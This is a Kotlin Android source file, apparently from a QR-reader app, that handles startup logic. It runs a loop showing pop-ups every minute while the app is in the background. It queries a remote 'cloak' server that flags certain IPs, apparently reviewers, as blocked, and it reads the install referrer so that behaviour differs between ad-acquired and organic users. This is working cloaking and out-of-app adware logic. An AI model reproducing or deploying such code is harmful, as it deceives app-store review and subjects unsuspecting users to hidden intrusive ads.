package com.qr.myqr.data

import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.android.installreferrer.api.ReferrerDetails
import com.qr.myqr.appIns
import com.qr.myqr.data.http.HttpClient
import com.qr.myqr.data.http.IHttpCallback
import com.qr.myqr.isReleaseMode
import com.qr.myqr.pop.PopManager
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.Headers

object StartupProvider {

    fun onStart() {
        OneDayCache.ins.checkIfAnotherDay()
        AppCache.ins.firstInAppTms
        StartupReceiver.doRegister(appIns)
        GlobalScope.launch {
            queryRefer()
            queryCloak()

            while (true) {
                //定时弹窗
                if (!appIns.isAppForeground()) {
                    PopManager.pop()
                }
                delay(60_000L)
            }
        }
    }

    /**
     * 当前用户是否安全
     * */
    fun isOneShotEnable(): Boolean {
        return when (RemoteConfig.ins.getSafeMode()) {
            0L -> true
            1L -> isUserBuyer
            2L -> isUserBuyer && !isUserBlock
            else -> false
        }
    }

    fun isInsRefEnable(): Boolean {
        return isUserBuyer
    }

    private var isUserBlock = false
    private fun queryCloak() {
        val cloakValue = AppCache.ins.cloakValue
        if (!cloakValue.isNullOrEmpty()) {
            isUserBlock = cloakValue == "2"
            return
        }
        FirebaseEvent.event("clo_start")
        val httpUrl = if (isReleaseMode) "https://api.suireader.live/ca/cc/" else "https://test.suireader.live/ca/cc/"
        val headerMap = HashMap<String, String>()
        headerMap["ISSU"] = appIns.packageName
        HttpClient.ins.getSync(httpUrl, headerMap, object :IHttpCallback {
            override fun onSuccess(headers: Headers, body: String?) {
                //1： 包名不匹配 2：命中IP 3：未命中
                val header1 = headers["C1"]
                AppCache.ins.cloakValue = header1 ?: ""
                isUserBlock = header1 == "2"

                var subHost = headers["C2"]
                if (subHost.isNullOrEmpty() || subHost.length < 2) return
                subHost = subHost.substring(1, subHost.length - 1)
                subHost = subHost.reversed()

                if (RemoteConfig.ins.getCollectMode()) {
                    FirebaseEvent.event("cloak_ip", "value", subHost)
                }
                FirebaseEvent.event("clo_success", "detail", if (isUserBlock) "success" else "fail")
            }

            override fun onError(code: Int, error: String?) {
                FirebaseEvent.event("clo_fail", "detail", if (error.isNullOrEmpty()) code.toString() else error )
            }
        })
    }

    var isUserBuyer = true
    var isUserBuyerFb = false
    var isUserBuyerGg = false
    var isUserCommon = false
    private fun recognizeUser(installRefer: String) {
        isUserBuyerFb = installRefer.contains("fb4a", false)
        isUserBuyerGg = installRefer.contains("gclid", false)
                || installRefer.contains("not%20set", false)
                || installRefer.contains("youtubeads", false)
                || installRefer.contains("%7B%22", false)
        isUserBuyer = isUserBuyerFb || isUserBuyerGg
        isUserCommon = !isUserBuyer
    }

    private fun queryRefer() {
        val refer = AppCache.ins.referValue
        if (refer.isNotEmpty()) {
            recognizeUser(refer)
            return
        }

        FirebaseEvent.event("refe_start")
        try {
            val referrerClient = InstallReferrerClient.newBuilder(appIns).build()
            referrerClient.startConnection(object : InstallReferrerStateListener {

                override fun onInstallReferrerSetupFinished(responseCode: Int) {
                    when (responseCode) {
                        InstallReferrerClient.InstallReferrerResponse.OK -> {
                            // Connection established.
                            val response: ReferrerDetails = referrerClient.installReferrer ?: return
                            val version = response.installVersion ?: ""
                            val clickTime: Long = response.referrerClickTimestampSeconds
                            val beginTime: Long = response.installBeginTimestampSeconds
                            val serverClickTime = response.referrerClickTimestampServerSeconds
                            val serverBeginTime = response.installBeginTimestampServerSeconds
                            val referrerUrl: String = response.installReferrer ?: ""
                            val gpParam = response.googlePlayInstantParam

                            AppCache.ins.referValue = referrerUrl
                            recognizeUser(referrerUrl)
                            referrerClient.endConnection()
                            FirebaseEvent.event("refe_end", "result", if (isUserBuyer) "success" else "fail")
                            //NewUploaderImpl.doReferrer(referrerUrl, version, beginTime, serverClickTime)
                        }
                    }
                }

                override fun onInstallReferrerServiceDisconnected() {
                    // Try to restart the connection on the next request to
                    // Google Play by calling the startConnection() method.
                }
            })
        } catch (e: Exception) {
        }
    }
}